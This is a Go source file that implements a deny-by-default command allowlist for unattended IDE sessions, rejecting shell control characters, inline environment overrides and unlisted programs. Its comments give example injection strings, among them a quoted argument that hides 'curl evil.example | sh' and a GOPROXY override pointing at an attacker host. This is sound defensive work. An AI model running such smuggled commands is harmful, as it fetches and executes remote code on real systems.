// Package unattended implements ADR-012 Batch A: the command allowlist
// and network-restriction policy for unattended IDE sessions.
//
// This package is a standalone decision engine only. CheckCommand
// answers exactly one question — "would this command line be allowed
// to run in an unattended session" — and nothing else. It is not wired
// into any execution path yet: no unattended session lifecycle exists
// (that's later batches — consent, task division, transcript logging).
// The existing attended companion terminal (internal/companion) and
// ADR-011's sustained loop are not touched by this package and stay
// completely unchanged, per ADR-012's own explicit scoping: the
// presence-gate reversal applies to unattended sessions only.
//
// The policy is a real allowlist, not a blocklist: a fixed, closed set
// of known-safe command shapes (real build/test/lint tooling, and
// package-manager installs against real default registries) is
// enumerated below, and anything that doesn't structurally match one
// of them is denied by default. This is deliberately the opposite
// mechanism from ADR-010's rejected blocklist — there is no attempt
// here to enumerate bad commands, only good ones.
package unattended

import (
	"fmt"
	"regexp"
	"strings"
)

// Decision is CheckCommand's answer: whether raw would run, and why
// not when it wouldn't — every denial carries a real, specific reason,
// never a bare "no," so a denial is debuggable rather than opaque.
type Decision struct {
	Allowed bool
	Reason  string
}

func deny(format string, args ...any) Decision {
	return Decision{Allowed: false, Reason: fmt.Sprintf(format, args...)}
}

func allow() Decision {
	return Decision{Allowed: true}
}

// forbiddenBytes are real shell control characters — chaining (`;`,
// `&`, `|`), substitution (backtick, `$`), redirection (`<`, `>`), and
// line breaks. Checked against the raw, untokenized string, before any
// quote-aware parsing happens: a naive tokenizer-first approach can be
// bypassed by hiding a second command inside a quoted argument (e.g.
// `npm run "test; curl evil.example | sh"`) — quoting an argument does
// not make its literal bytes safe once this string is ever handed to a
// real interactive shell (which is exactly what backs the companion's
// real terminal), so this check runs first and rejects unconditionally,
// regardless of quoting. Backslash is included too: escape sequences
// are exactly the kind of thing that make "is this actually safe"
// parsing ambiguous, and no allowlisted command in this package needs
// one. A NUL byte is included too — real exec argument handling treats
// it as a string terminator, a classic argument-truncation/injection
// primitive.
const forbiddenBytes = ";&|`$<>\n\r\\\x00"

// envAssignment matches a leading `NAME=value` token — real shell
// syntax for setting an environment variable just for the command that
// follows (`GOPROXY=http://evil.example go build`, `NODE_OPTIONS=...
// npm install`). Every allowlisted command below runs with this
// process's own real environment, deliberately never an
// attacker-influenced override of it.
var envAssignment = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*=`)

// CheckCommand decides whether raw — one real command line, exactly as
// it would be typed into a terminal — is allowed to run in an
// unattended session. Denies by default: a command only runs if it
// structurally matches one of the enumerated shapes in allowedPrograms.
func CheckCommand(raw string) Decision {
	trimmed := strings.TrimSpace(raw)
	if trimmed == "" {
		return deny("empty command")
	}
	if strings.ContainsAny(trimmed, forbiddenBytes) {
		return deny("command contains a shell control character (chaining, substitution, redirection, or a line break) — not permitted in unattended mode")
	}

	tokens, err := tokenize(trimmed)
	if err != nil {
		return deny("command couldn't be parsed: %v", err)
	}
	if len(tokens) == 0 {
		return deny("empty command")
	}
	if envAssignment.MatchString(tokens[0]) {
		return deny("inline environment variable assignment (%q) is not permitted — an unattended command runs with its own real environment, never an overridden one", tokens[0])
	}

	program := tokens[0]
	check, ok := allowedPrograms[program]
	if !ok {
		return deny("%q is not on the unattended command allowlist", program)
	}
	return check(tokens[1:])
}

// tokenize splits raw into shell-style words: whitespace-separated,
// with single or double quotes grouping a word that contains spaces.
// No escape sequences and no expansion of any kind — backslash is
// already rejected by CheckCommand's own forbiddenBytes check before
// this ever runs, so this stays a plain, minimal word-splitter, not a
// real shell grammar.
func tokenize(raw string) ([]string, error) {
	var tokens []string
	var cur strings.Builder
	inToken := false
	var quote rune

	flush := func() {
		if inToken {
			tokens = append(tokens, cur.String())
			cur.Reset()
			inToken = false
		}
	}

	for _, r := range raw {
		switch {
		case quote != 0:
			if r == quote {
				quote = 0
			} else {
				cur.WriteRune(r)
			}
		case r == '\'' || r == '"':
			quote = r
			inToken = true
		case r == ' ' || r == '\t':
			flush()
		default:
			inToken = true
			cur.WriteRune(r)
		}
	}
	if quote != 0 {
		return nil, fmt.Errorf("unterminated %c quote", quote)
	}
	flush()
	return tokens, nil
}
